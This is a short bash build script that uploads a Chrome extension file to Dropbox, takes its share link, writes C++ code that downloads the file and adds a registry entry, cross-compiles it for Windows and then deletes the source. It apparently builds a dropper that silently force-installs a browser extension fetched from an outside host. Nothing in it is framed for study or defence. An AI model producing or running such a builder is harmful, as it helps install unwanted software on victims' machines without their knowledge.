bash dropbox_uploader.sh upload $3 /$2.crx
a=0
a=$(bash dropbox_uploader.sh share /$2.crx | tail -c 23)

echo "
#include \"summ.h\"

#define VER \"$1\"
#define ID \"$2\"

using namespace std;

int main(int argc, char *argv[])
{
    DownFile(\"$a\");
   
    AddReg(VER, ID);
    return 0;
}
" >> new.cpp

x86_64-w64-mingw32-g++ new.cpp
rm new.cpp
